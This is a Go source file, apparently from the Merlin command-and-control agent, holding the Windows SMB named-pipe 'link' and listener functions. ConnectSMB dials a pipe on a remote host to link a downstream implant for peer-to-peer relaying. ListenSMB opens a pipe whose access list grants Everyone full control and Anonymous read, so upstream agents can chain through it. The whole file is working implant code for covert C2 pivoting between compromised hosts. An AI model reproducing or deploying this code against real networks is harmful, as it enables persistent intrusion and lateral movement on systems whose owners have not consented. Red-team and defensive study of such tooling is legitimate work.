//go:build windows

// This smb.go file is part of the "link" command and is not a standalone command

package commands

import (
	// Standard
	"bytes"
	"encoding/binary"
	"encoding/gob"
	"fmt"
	"net"
	"time"
	"unsafe"

	// X Packages
	"golang.org/x/sys/windows"

	// 3rd Party
	"github.com/Ne0nd0g/npipe"

	// Merlin
	"github.com/Ne0nd0g/merlin-message"
	"github.com/Ne0nd0g/merlin-message/jobs"

	// Internal
	"github.com/Ne0nd0g/merlin-agent/v2/cli"
	"github.com/Ne0nd0g/merlin-agent/v2/p2p"
)

// ConnectSMB establishes an SMB connection over a named pipe to a smb-bind peer-to-peer Agent
func ConnectSMB(host, pipe string) (results jobs.Results) {
	cli.Message(cli.DEBUG, fmt.Sprintf("commands/smb.ConnectSMB(): entering into function with network: %s, pipe: %s", host, pipe))

	// Validate incoming arguments
	// The period is used to signify "this host"
	if host != "." {
		_, err := net.ResolveTCPAddr("tcp", fmt.Sprintf("%s:445", host))
		if err != nil {
			results.Stderr = fmt.Sprintf("commands.smb.ConnectSMB(): there was an error validating the input network address: %s", err)
			return
		}
	}

	address := fmt.Sprintf("\\\\%s\\pipe\\%s", host, pipe)

	// Establish connection to downstream agent
	conn, err := npipe.Dial(address)
	if err != nil {
		results.Stderr = fmt.Sprintf("commands/smb.ConnectSMB(): there was an error attempting to link the agent: %s", err.Error())
		return
	}

	var n int
	var tag uint32
	var length uint64
	var buff bytes.Buffer
	for {
		data := make([]byte, 4096)
		// Need to have a read on the network connection for data here in this function to retrieve the linked Agent's ID so the linkedAgent structure can be stored
		n, err = conn.Read(data)
		if err != nil {
			msg := fmt.Sprintf("there was an error reading data from linked agent %s: %s", address, err)
			results.Stderr = msg
			cli.Message(cli.WARN, msg)
			return
		}
		cli.Message(cli.DEBUG, fmt.Sprintf("commands/link.ConnectSMB(): Read %d bytes from linked %s agent %s at %s", n, p2p.String(p2p.SMBBIND), address, time.Now().UTC().Format(time.RFC3339)))

		// Add the bytes to the buffer
		n, err = buff.Write(data[:n])
		if err != nil {
			msg := fmt.Sprintf("commands/link.ConnectSMB(): there was an error writing %d bytes from linked agent into the buffer %s: %s", n, address, err)
			results.Stderr = msg
			cli.Message(cli.WARN, msg)
			return
		}

		// If this is the first read on the connection determine the tag and data length
		if tag == 0 {
			// Ensure we have enough data to read the tag/type which is 4-bytes
			if buff.Len() < 4 {
				cli.Message(cli.DEBUG, fmt.Sprintf("commands/link.ConnectSMB(): Need at least 4 bytes in the buffer to read the Type/Tag for TLV but only have %d", buff.Len()))
				continue
			}
			tag = binary.BigEndian.Uint32(data[:4])
			if tag != 1 {
				msg := fmt.Sprintf("commands/link.ConnectSMB(): Expected a type/tag value of 1 for TLV but got %d", tag)
				results.Stderr = msg
				cli.Message(cli.WARN, msg)
				return
			}
		}

		if length == 0 {
			// Ensure we have enough data to read the Length from TLV which is 8-bytes plus the 4-byte tag/type size
			if buff.Len() < 12 {
				cli.Message(cli.DEBUG, fmt.Sprintf("command/link.ConnectSMB(): Need at least 12 bytes in the buffer to read the Length for TLV but only have %d", buff.Len()))
				continue
			}
			length = binary.BigEndian.Uint64(data[4:12])
		}

		// If we've read all the data according to the length provided in TLV, then break the for loop
		// Type/Tag size is 4-bytes, Length size is 8-bytes for TLV
		if uint64(buff.Len()) == length+4+8 {
			cli.Message(cli.DEBUG, fmt.Sprintf("command/link.ConnectSMB(): Finished reading data length of %d bytes into the buffer and moving forward to deconstruct the data", length))
			break
		} else {
			cli.Message(cli.DEBUG, fmt.Sprintf("command/link.ConnectSMB(): Read %d of %d bytes into the buffer", buff.Len(), length+4+8))
		}
	}
	cli.Message(cli.NOTE, fmt.Sprintf("Read %d bytes from linked %s agent %s at %s", buff.Len(), p2p.String(p2p.SMBBIND), address, time.Now().UTC().Format(time.RFC3339)))

	// Decode GOB from server response into Base
	var msg messages.Delegate
	// First 4-bytes are for the Type/Tag, next 8-bytes are for the Length in TLV
	reader := bytes.NewReader(buff.Bytes()[12:])

	errD := gob.NewDecoder(reader).Decode(&msg)
	if errD != nil {
		err = fmt.Errorf("there was an error decoding the gob message: %s", errD)
		return
	}

	// Store LinkedAgent
	link := p2p.NewLink(msg.Agent, msg.Listener, conn, p2p.SMBBIND, conn.RemoteAddr())
	peerToPeerService.AddLink(link)

	peerToPeerService.AddDelegate(msg)

	results.Stdout = fmt.Sprintf("Successfully connected to %s Agent %s at %s", link.String(), msg.Agent, address)

	// The listen function is in commands/listen.go
	go listen(conn, p2p.SMBBIND)
	return
}

// ListenSMB binds to the provided named pipe and listens for incoming SMB connections
func ListenSMB(pipe string) error {
	cli.Message(cli.DEBUG, fmt.Sprintf("commands/smb.ListenSMB(): entering into function with pipe: %s", pipe))
	addr := fmt.Sprintf("\\\\.\\pipe\\%s", pipe)

	// Create the security descriptor
	// D = Discretionary Access List (DACL)
	// A = Allow
	// FA = FILE_ALL_ACCESS, FR = FILE_GENERIC_READ
	// https://learn.microsoft.com/en-us/windows/win32/secauthz/ace-strings
	// SY = SYSTEM, BA = BUILT-IN ADMINISTRATORS, CO = CREATOR OWNER, WD = EVERYONE, AN = ANONYMOUS
	// https://learn.microsoft.com/en-us/windows/win32/secauthz/sid-strings
	// Leave the Owner "O:" off, and it will be set to the user that created the named pipe by default
	// Leave the Group "G:" off, and it will be set to the "None" group by default
	sddl := "D:(A;;FA;;;SY)(A;;FA;;;BA)(A;;FA;;;CO)(A;;FA;;;WD)(A;;FR;;;AN)"

	var sd *windows.SECURITY_DESCRIPTOR
	var err error
	sd, err = windows.SecurityDescriptorFromString(sddl)
	if err != nil {
		return fmt.Errorf("commands/smb.ListenSMB(): there was an error converting the SDDL string \"%s\" to a SECURITY_DESCRIPTOR: %s", sddl, err)
	}

	// Create the Security Attributes
	// https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa379560(v=vs.85)
	sa := windows.SecurityAttributes{
		Length:             uint32(unsafe.Sizeof(sd)),
		SecurityDescriptor: sd,
		InheritHandle:      1,
	}

	mode := windows.PIPE_ACCESS_DUPLEX | windows.FILE_FLAG_OVERLAPPED | windows.FILE_FLAG_FIRST_PIPE_INSTANCE
	listener, err := npipe.NewPipeListener(addr, uint32(mode), windows.PIPE_TYPE_BYTE, windows.PIPE_UNLIMITED_INSTANCES, 512, 512, 0, &sa)
	if err != nil {
		// Try again without FILE_FLAG_FIRST_PIPE_INSTANCE
		mode = windows.PIPE_ACCESS_DUPLEX | windows.FILE_FLAG_OVERLAPPED
		listener, err = npipe.NewPipeListener(addr, uint32(mode), windows.PIPE_TYPE_BYTE, windows.PIPE_UNLIMITED_INSTANCES, 512, 512, 0, &sa)
		if err != nil {
			return fmt.Errorf("clients/smb.Connect(): there was an error listening on %s: %s", addr, err)
		}
	}

	// Add to global listeners
	var ok bool
	var l p2pListener
	for _, l = range p2pListeners {
		if l.Type == SMB {
			// Check to see if there is already a p2pListener in the map for this address
			if listener.Addr() == l.Listener.(net.Listener).Addr() {
				ok = true
				break
			}
		}
	}

	if !ok {
		l = p2pListener{
			Addr:     listener.Addr().String(),
			Listener: listener,
			Type:     SMB,
		}
		p2pListeners = append(p2pListeners, l)
	}

	cli.Message(cli.NOTE, fmt.Sprintf("Started SMB listener on %s and waiting for a connection...", addr))

	// Listen for initial connection from upstream agent
	go accept(listener, p2p.SMBREVERSE)
	return nil
}
